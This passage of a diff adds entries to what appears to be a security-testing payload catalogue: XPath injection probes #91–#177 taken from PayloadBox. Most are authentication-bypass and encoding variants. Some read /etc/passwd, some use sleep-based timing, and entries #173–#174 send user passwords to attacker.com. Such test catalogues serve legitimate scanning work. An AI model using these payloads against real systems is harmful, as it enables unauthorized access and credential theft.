+    "id": "xml-injection-pbox-0091",
+    "name": "Xpath Injection #91",
+    "template": "' or //user[id<100] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[id<100] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0092",
+    "name": "Xpath Injection #92",
+    "template": "' or //user[id!=0] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[id!=0] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0093",
+    "name": "Xpath Injection #93",
+    "template": "' or //user[@id=1] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[@id=1] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0094",
+    "name": "Xpath Injection #94",
+    "template": "' or starts-with(//user[1]/name,'a') or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or starts-with(//user[1]/name,'a') or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0095",
+    "name": "Xpath Injection #95",
+    "template": "' or substring(//user[1]/name,1,5)='admin' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or substring(//user[1]/name,1,5)='admin' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0096",
+    "name": "Xpath Injection #96",
+    "template": "' or substring-before(//user[1]/name,'@')='admin' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or substring-before(//user[1]/name,'@')='admin' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0097",
+    "name": "Xpath Injection #97",
+    "template": "' or substring-after(//user[1]/email,'@')='company.com' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or substring-after(//user[1]/email,'@')='company.com' or '...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0098",
+    "name": "Xpath Injection #98",
+    "template": "' or concat(//user[1]/name,//user[1]/password) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or concat(//user[1]/name,//user[1]/password) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0099",
+    "name": "Xpath Injection #99",
+    "template": "' or normalize-space(//user[1]/name)='admin' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or normalize-space(//user[1]/name)='admin' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0100",
+    "name": "Xpath Injection #100",
+    "template": "' or translate(//user[1]/name,'abc','123')='123min' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or translate(//user[1]/name,'abc','123')='123min' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0101",
+    "name": "Xpath Injection #101",
+    "template": "' or number(//user[1]/id)>0 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or number(//user[1]/id)>0 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0102",
+    "name": "Xpath Injection #102",
+    "template": "' or floor(//user[1]/id)=1 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or floor(//user[1]/id)=1 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0103",
+    "name": "Xpath Injection #103",
+    "template": "' or ceiling(//user[1]/score)=100 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or ceiling(//user[1]/score)=100 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0104",
+    "name": "Xpath Injection #104",
+    "template": "' or round(//user[1]/rating)=5 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or round(//user[1]/rating)=5 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0105",
+    "name": "Xpath Injection #105",
+    "template": "' or sum(//user/score)>100 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or sum(//user/score)>100 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0106",
+    "name": "Xpath Injection #106",
+    "template": "' or boolean(//user[1]) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or boolean(//user[1]) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0107",
+    "name": "Xpath Injection #107",
+    "template": "' or not(//user[name='test']) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or not(//user[name='test']) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0108",
+    "name": "Xpath Injection #108",
+    "template": "' or true() or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or true() or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0109",
+    "name": "Xpath Injection #109",
+    "template": "' or false() and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or false() and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0110",
+    "name": "Xpath Injection #110",
+    "template": "' or lang('en') or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or lang('en') or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0111",
+    "name": "Xpath Injection #111",
+    "template": "' or last()>0 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or last()>0 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0112",
+    "name": "Xpath Injection #112",
+    "template": "' or position()=1 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or position()=1 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0113",
+    "name": "Xpath Injection #113",
+    "template": "' or count(//*) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or count(//*) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0114",
+    "name": "Xpath Injection #114",
+    "template": "' or id('user1') or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or id('user1') or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0115",
+    "name": "Xpath Injection #115",
+    "template": "' or local-name(//*[1]) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or local-name(//*[1]) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0116",
+    "name": "Xpath Injection #116",
+    "template": "' or namespace-uri(//*[1]) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or namespace-uri(//*[1]) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0117",
+    "name": "Xpath Injection #117",
+    "template": "%27%20or%20%271%27=%271",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: %27%20or%20%271%27=%271",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0118",
+    "name": "Xpath Injection #118",
+    "template": "%22%20or%20%221%22=%221",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: %22%20or%20%221%22=%221",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0119",
+    "name": "Xpath Injection #119",
+    "template": "%27%20or%201=1%20or%20%27",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: %27%20or%201=1%20or%20%27",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0120",
+    "name": "Xpath Injection #120",
+    "template": "%2f%2f%75%73%65%72",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: %2f%2f%75%73%65%72",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0121",
+    "name": "Xpath Injection #121",
+    "template": "%2527%2520or%2520%25271%2527=%25271",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: %2527%2520or%2520%25271%2527=%25271",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0122",
+    "name": "Xpath Injection #122",
+    "template": "%2527%2520or%25201=1%2520or%2520%2527",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: %2527%2520or%25201=1%2520or%2520%2527",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0123",
+    "name": "Xpath Injection #123",
+    "template": "\\u0027 or \\u00271\\u0027=\\u00271",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \\u0027 or \\u00271\\u0027=\\u00271",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0124",
+    "name": "Xpath Injection #124",
+    "template": "\\u0022 or \\u00221\\u0022=\\u00221",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \\u0022 or \\u00221\\u0022=\\u00221",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0125",
+    "name": "Xpath Injection #125",
+    "template": "0x27 or 0x313d31",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: 0x27 or 0x313d31",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0126",
+    "name": "Xpath Injection #126",
+    "template": "&#x27; or &#x31;=&#x31;",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: &#x27; or &#x31;=&#x31;",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0127",
+    "name": "Xpath Injection #127",
+    "template": "&#39; or &#49;=&#49;",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: &#39; or &#49;=&#49;",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0128",
+    "name": "Xpath Injection #128",
+    "template": "&#34; or &#49;=&#49;",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: &#34; or &#49;=&#49;",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0129",
+    "name": "Xpath Injection #129",
+    "template": "' or '1'='1'<!--",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or '1'='1'<!--",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0130",
+    "name": "Xpath Injection #130",
+    "template": "\" or \"1\"=\"1\"<!--",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" or \"1\"=\"1\"<!--",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0131",
+    "name": "Xpath Injection #131",
+    "template": "' or 1=1 #",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or 1=1 #",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0132",
+    "name": "Xpath Injection #132",
+    "template": "' or 1=1 //",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or 1=1 //",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0133",
+    "name": "Xpath Injection #133",
+    "template": "' or 1=1 /* comment */",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or 1=1 /* comment */",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0134",
+    "name": "Xpath Injection #134",
+    "template": "' OR '1'='1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' OR '1'='1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0135",
+    "name": "Xpath Injection #135",
+    "template": "' Or '1'='1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' Or '1'='1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0136",
+    "name": "Xpath Injection #136",
+    "template": "' oR '1'='1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' oR '1'='1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0137",
+    "name": "Xpath Injection #137",
+    "template": "'or'1'='1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: 'or'1'='1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0138",
+    "name": "Xpath Injection #138",
+    "template": "'  or  '1'='1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: '  or  '1'='1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0139",
+    "name": "Xpath Injection #139",
+    "template": "'\tor\t'1'='1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: '\tor\t'1'='1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0140",
+    "name": "Xpath Injection #140",
+    "template": "'%09or%091=1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: '%09or%091=1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0141",
+    "name": "Xpath Injection #141",
+    "template": "'%0aor%0a1=1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: '%0aor%0a1=1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0142",
+    "name": "Xpath Injection #142",
+    "template": "')) or (('1'='1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ')) or (('1'='1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0143",
+    "name": "Xpath Injection #143",
+    "template": "') or '1'='1' or ('",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ') or '1'='1' or ('",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0144",
+    "name": "Xpath Injection #144",
+    "template": "))] or 1=1 or [(1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ))] or 1=1 or [(1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0145",
+    "name": "Xpath Injection #145",
+    "template": "']] or [['1'='1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ']] or [['1'='1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0146",
+    "name": "Xpath Injection #146",
+    "template": "'] or '1'='1' or ['",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: '] or '1'='1' or ['",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0147",
+    "name": "Xpath Injection #147",
+    "template": "]] | //user[1=1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ]] | //user[1=1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0148",
+    "name": "Xpath Injection #148",
+    "template": "' | //user | '",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' | //user | '",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0149",
+    "name": "Xpath Injection #149",
+    "template": "' | //* | '",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' | //* | '",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0150",
+    "name": "Xpath Injection #150",
+    "template": "' or //user | //admin or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user | //admin or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0151",
+    "name": "Xpath Injection #151",
+    "template": "' or //username | //password or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //username | //password or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0152",
+    "name": "Xpath Injection #152",
+    "template": "' or //user[name[contains(.,'admin')]] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[name[contains(.,'admin')]] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0153",
+    "name": "Xpath Injection #153",
+    "template": "' or //user[role[text()='admin']] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[role[text()='admin']] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0154",
+    "name": "Xpath Injection #154",
+    "template": "' or //user[credentials[password='123']] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[credentials[password='123']] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0155",
+    "name": "Xpath Injection #155",
+    "template": "' or (//user[id=1] and //user[name='admin']) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or (//user[id=1] and //user[name='admin']) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0156",
+    "name": "Xpath Injection #156",
+    "template": "' or //user[id=1 and name='admin'] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[id=1 and name='admin'] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0157",
+    "name": "Xpath Injection #157",
+    "template": "' or //user[@id=1 or @name='admin'] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[@id=1 or @name='admin'] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0158",
+    "name": "Xpath Injection #158",
+    "template": "' or //user/text() or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user/text() or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0159",
+    "name": "Xpath Injection #159",
+    "template": "' or //username/text()='admin' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //username/text()='admin' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0160",
+    "name": "Xpath Injection #160",
+    "template": "' or //*/text() or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //*/text() or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0161",
+    "name": "Xpath Injection #161",
+    "template": "' or normalize-space(//user/text()) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or normalize-space(//user/text()) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0162",
+    "name": "Xpath Injection #162",
+    "template": "' or //![CDATA[admin]] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //![CDATA[admin]] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0163",
+    "name": "Xpath Injection #163",
+    "template": "<![CDATA[' or '1'='1]]>",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: <![CDATA[' or '1'='1]]>",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0164",
+    "name": "Xpath Injection #164",
+    "template": "' or '&admin;'='&admin;",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or '&admin;'='&admin;",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0165",
+    "name": "Xpath Injection #165",
+    "template": "&apos; or &apos;1&apos;=&apos;1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: &apos; or &apos;1&apos;=&apos;1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0166",
+    "name": "Xpath Injection #166",
+    "template": "&quot; or &quot;1&quot;=&quot;1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: &quot; or &quot;1&quot;=&quot;1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0167",
+    "name": "Xpath Injection #167",
+    "template": "' or namespace::* or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or namespace::* or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0168",
+    "name": "Xpath Injection #168",
+    "template": "' or //namespace::node() or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //namespace::node() or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0169",
+    "name": "Xpath Injection #169",
+    "template": "' and doc-available('file:///etc/passwd') and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and doc-available('file:///etc/passwd') and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0170",
+    "name": "Xpath Injection #170",
+    "template": "' and error() and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and error() and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0171",
+    "name": "Xpath Injection #171",
+    "template": "' or 1 div 0 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or 1 div 0 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0172",
+    "name": "Xpath Injection #172",
+    "template": "' or //user[1] div //user[2] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[1] div //user[2] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0173",
+    "name": "Xpath Injection #173",
+    "template": "' or doc('http://attacker.com/?data=',//user[1]/password) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or doc('http://attacker.com/?data=',//user[1]/password) or...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0174",
+    "name": "Xpath Injection #174",
+    "template": "' or document(concat('http://attacker.com/?',//user[1]/password)) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or document(concat('http://attacker.com/?',//user[1]/passw...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0175",
+    "name": "Xpath Injection #175",
+    "template": "' and sleep(5) and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and sleep(5) and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0176",
+    "name": "Xpath Injection #176",
+    "template": "' or sleep(5) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or sleep(5) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0177",
+    "name": "Xpath Injection #177",
+    "template": "' or system-property('xsl:version') or ''='",
